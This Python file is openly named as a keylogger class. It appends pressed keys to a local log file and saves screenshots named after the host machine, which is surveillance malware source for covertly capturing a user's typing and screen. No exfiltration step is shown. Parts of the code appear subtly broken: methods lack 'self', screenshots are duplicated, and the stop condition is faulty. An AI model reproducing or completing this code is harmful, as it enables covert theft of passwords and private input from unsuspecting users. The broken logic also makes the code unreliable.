import os, socket, pyautogui

from pynput.keyboard import Key
from functions import translateKeys

logFile = 'logs/log.txt'

class keylogger:
    def __init__(self):
        pass

    def screenshot(self):
        file = f'{socket.gethostname()}.png'
        if not os.path.exists(file):
            pyautogui.screenshot().save(file)
            pyautogui.screenshot().close()
            
        pyautogui.screenshot().save(file)
        pyautogui.screenshot().close()
        
    def writeLog(key):
        keydata = str(key).replace("'", "") 
        tKeys = translateKeys.rtrnKeys()
       
        for key in tKeys:
            keydata = keydata.replace(key, tKeys[key])

        with open(logFile, "a") as l:
            l.write(keydata)
            
    def stopKeyLogger(key):
        if key == Key.esc and Key.f2:
            return False